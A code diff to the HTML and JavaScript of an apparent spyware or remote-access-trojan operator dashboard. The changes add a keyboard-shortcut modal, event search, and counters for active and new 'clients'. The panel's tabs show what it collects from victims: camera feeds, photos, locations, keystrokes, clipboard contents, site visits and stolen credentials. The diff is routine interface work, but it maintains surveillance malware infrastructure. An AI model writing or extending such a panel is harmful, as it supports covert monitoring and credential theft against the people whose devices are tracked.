@@ -290,6 +290,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 /* copy btn */
 .copy-btn{background:none;border:1px solid var(--border2);color:var(--text2);font-size:.6rem;padding:1px 5px;border-radius:3px;cursor:pointer;margin-left:4px;vertical-align:middle}
 .copy-btn:hover{border-color:var(--accent);color:var(--accent)}
+kbd{display:inline-block;background:var(--panel2);border:1px solid var(--border2);border-bottom-width:2px;border-radius:4px;padding:2px 7px;font-family:monospace;font-size:.72rem;color:var(--text);white-space:nowrap}
 /* client action bar */
 .cl-action-bar{display:flex;gap:4px;margin-top:6px;flex-wrap:wrap}
 .cl-action-btn{font-size:.6rem;padding:2px 7px;border-radius:4px;border:1px solid var(--border);background:var(--panel2);color:var(--text2);cursor:pointer;white-space:nowrap}
@@ -356,7 +357,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <button class="btn" onclick="window.open('/','_blank')">Preview Site</button>
     <div class="search-wrap"><input type="text" id="globalSearch" placeholder="Search everything..." onkeyup="onGlobalSearch(event)"><button class="search-btn" onclick="doGlobalSearch()">🔍</button></div>
     <button class="btn export" onclick="location.href='/api/export?token='+AUTH_TOKEN">Export JSON</button>
-    <span id="refresh-ring" title="Refreshing..."></span><span style="font-size:.55rem;color:var(--dim);cursor:default;user-select:none" title="Ctrl+K:search  1-9:tabs  R:refresh  Esc:close">[shortcuts]</span>
+    <span id="refresh-ring" title="Refreshing..."></span><button class="btn" onclick="openShortcutModal()" title="Keyboard shortcuts (?)">⌨ ?</button>
     <button class="btn" onclick="refreshAll()">↻ Refresh</button>
     <button id="theme-btn" class="btn" onclick="toggleTheme()" title="Toggle dark/light mode">🌙</button>
     <button class="btn danger" onclick="if(confirm('Delete ALL data?'))clearAll()">Clear All</button>
@@ -366,7 +367,9 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
 <!-- STATS -->
 <div class="stats">
     <div class="stat"><div id="s-on" class="n">0</div><div class="l">Online</div></div>
+    <div class="stat" title="Actief in de afgelopen 5 minuten"><div id="s-active5m" class="n" style="color:#56ccf2">0</div><div class="l" style="color:#56ccf2">5m Actief</div></div>
     <div class="stat"><div id="s-total" class="n">0</div><div class="l">Clients</div></div>
+    <div class="stat" title="Nieuwe clients vandaag"><div id="s-new-today" class="n" style="color:#6fcf97">0</div><div class="l" style="color:#6fcf97">Nieuw</div></div>
     <div class="stat"><div id="s-photo" class="n">0</div><div class="l">Photos</div></div>
     <div class="stat"><div id="s-vid" class="n">0</div><div class="l">Videos</div></div>
     <div class="stat"><div id="s-loc" class="n">0</div><div class="l">Locations</div></div>
@@ -518,7 +521,8 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <div class="pnl">
         <div class="pnl-h">
             <h2>Event Log</h2>
-            <div style="display:flex;align-items:center;gap:8px">
+            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+                <input id="ev-search" type="text" placeholder="Zoek eventos..." oninput="renderEvents()" style="background:var(--panel2);border:1px solid var(--border2);color:var(--text);padding:3px 8px;border-radius:4px;font-size:.65rem;font-family:inherit;outline:none;width:130px" title="Filter events by type or text">
                 <select id="ev-type-filter" onchange="renderEvents()" style="background:var(--panel2);border:1px solid var(--border2);color:var(--text);padding:3px 8px;border-radius:4px;font-size:.65rem;font-family:inherit;outline:none">
                     <option value="">All Types</option>
                     <option value="location">location</option>
@@ -692,9 +696,35 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
 <!-- LIGHTBOX -->
 <div class="lightbox" id="lightbox" onclick="this.classList.remove('show')"><img id="lb-img" src=""></div>
 
+<!-- KEYBOARD SHORTCUTS MODAL -->
+<div id="shortcut-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:9999;align-items:center;justify-content:center" onclick="if(event.target===this)closeShortcutModal()">
+    <div style="background:var(--panel);border:1px solid var(--border2);border-radius:12px;padding:28px 32px;min-width:340px;max-width:500px;width:90%;max-height:80vh;overflow-y:auto">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:18px">
+            <h2 style="font-size:1rem;font-weight:700;letter-spacing:.04em">⌨️ Keyboard Shortcuts</h2>
+            <button onclick="closeShortcutModal()" style="background:none;border:none;color:var(--text2);font-size:1.2rem;cursor:pointer;padding:0 4px">✕</button>
+        </div>
+        <div style="display:grid;grid-template-columns:auto 1fr;gap:6px 20px;font-size:.72rem;line-height:1.9">
+            <kbd>R</kbd><span>Refresh all data</span>
+            <kbd>?</kbd><span>Keyboard shortcuts</span>
+            <kbd>G</kbd><span>Zoek (globale zoekopdracht)</span>
+            <kbd>1</kbd><span>Tab: Overview</span>
+            <kbd>2</kbd><span>Tab: Cameras</span>
+            <kbd>3</kbd><span>Tab: Photos</span>
+            <kbd>4</kbd><span>Tab: Map</span>
+            <kbd>5</kbd><span>Tab: Keystrokes</span>
+            <kbd>6</kbd><span>Tab: Clipboard</span>
+            <kbd>7</kbd><span>Tab: Visits</span>
+            <kbd>8</kbd><span>Tab: Credentials</span>
+            <kbd>9</kbd><span>Tab: Events</span>
+            <kbd>0</kbd><span>Tab: Settings</span>
+            <kbd>Esc</kbd><span>Sluit overlay / modal</span>
+        </div>
+        <div style="margin-top:18px;font-size:.62rem;color:var(--dim)">Shortcuts werken wanneer je niet in een invoerveld typt.</div>
+    </div>
+</div>
+
 <!-- TOASTS -->
 <div class="toast-area" id="toasts"></div>
-
 <!-- SEARCH RESULTS -->
 <div class="search-results" id="search-results">
     <div class="sr-header"><h3>Search Results</h3><button onclick="closeSearch()">✕</button></div>
@@ -779,7 +809,10 @@ function showRefreshRing() {
 // event type filter
 function clearEventFilter() {
     var f = document.getElementById('ev-type-filter');
-    if (f) { f.value = ''; renderEvents(); }
+    if (f) f.value = '';
+    var s = document.getElementById('ev-search');
+    if (s) s.value = '';
+    renderEvents();
 }
 
 // errors
@@ -915,9 +948,9 @@ function exportClient(clientId) {
 document.addEventListener('keydown', function(e) {
     if (e.ctrlKey && e.key === 'k') { e.preventDefault(); var s = document.getElementById('globalSearch'); if (s) s.focus(); return; }
     if (e.key === 'Escape') {
-        closeNotes(); closeTagModal();
-        var lb = document.getElementById('lightbox');
-        if (lb && lb.style.display !== 'none') lb.style.display = 'none';
+        closeNotes(); closeTagModal(); closeShortcutModal(); closeLightbox();
+        const sr = document.getElementById('search-results');
+        if (sr) sr.style.display = 'none';
         var gs = document.getElementById('globalSearch');
         if (gs && document.activeElement === gs) gs.blur();
         return;
@@ -925,9 +958,11 @@ document.addEventListener('keydown', function(e) {
     if (!e.ctrlKey && !e.altKey && !e.metaKey) {
         var ae = document.activeElement;
         if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA' || ae.tagName === 'SELECT')) return;
-        var tabMap = {'1':'overview','2':'cameras','3':'photos','4':'videos','5':'map','6':'keys','7':'clipboard','8':'visits','9':'events','0':'errors'};
+        var tabMap = {'1':'overview','2':'cameras','3':'photos','4':'map','5':'keys','6':'clipboard','7':'visits','8':'credentials','9':'events','0':'settings'};
         if (tabMap[e.key]) { var t = document.querySelector('.tab[data-v="' + tabMap[e.key] + '"]'); if (t) t.click(); }
         if (e.key === 'r' || e.key === 'R') { refreshAll(); showToast('Refreshing...'); }
+        if (e.key === '?' || (e.key === '/' && e.shiftKey)) { e.preventDefault(); openShortcutModal(); }
+        if (e.key === 'g' || e.key === 'G') { e.preventDefault(); const gs = $('#globalSearch'); if (gs) { gs.focus(); gs.select(); } }
     }
 });
 
@@ -1200,7 +1235,9 @@ async function refreshAll() {
         if (stats) {
             try {
                 $('#s-on').textContent = stats.onlineCount || 0;
+                $('#s-active5m').textContent = stats.active5mCount || 0;
                 $('#s-total').textContent = stats.clientCount || 0;
+                $('#s-new-today').textContent = stats.newTodayCount || 0;
                 $('#s-photo').textContent = stats.photoCount || 0;
                 $('#s-vid').textContent = stats.mediaCount || 0;
                 $('#s-loc').textContent = stats.locationCount || 0;
@@ -1784,7 +1821,16 @@ function renderEvents() {
             <span class="d">${fmtEvent(ev.data)}</span>
         </div>
     `).join('');
-    const filteredEvs = evTypeFilter ? events.filter(e => (e.type || '') === evTypeFilter) : events;
+    const filteredEvs = (() => {
+        let d = events;
+        if (evTypeFilter) d = d.filter(e => (e.type || '') === evTypeFilter);
+        const evSearch = (() => { try { const s = document.getElementById('ev-search'); return s ? s.value.trim().toLowerCase() : ''; } catch(x) { return ''; } })();
+        if (evSearch) d = d.filter(e => {
+            const raw = JSON.stringify(e).toLowerCase();
+            return raw.includes(evSearch);
+        });
+        return d;
+    })();
     if (list1) list1.innerHTML = html(filteredEvs.slice(0, 50));
     if (list2) {
         if (!filteredEvs.length) {
@@ -1891,6 +1937,18 @@ async function deleteClient(id) {
 function openLightbox(src) {
     $('#lb-img').src = src;
     $('#lightbox').classList.add('show');
+}
+function closeLightbox() {
+    $('#lightbox').classList.remove('show');
+}
+
+function openShortcutModal() {
+    const m = $('#shortcut-modal');
+    if (m) { m.style.display = 'flex'; }
+}
+function closeShortcutModal() {
+    const m = $('#shortcut-modal');
+    if (m) { m.style.display = 'none'; }
 }
 
 // ═══════════════════════════════════════════════════════════════
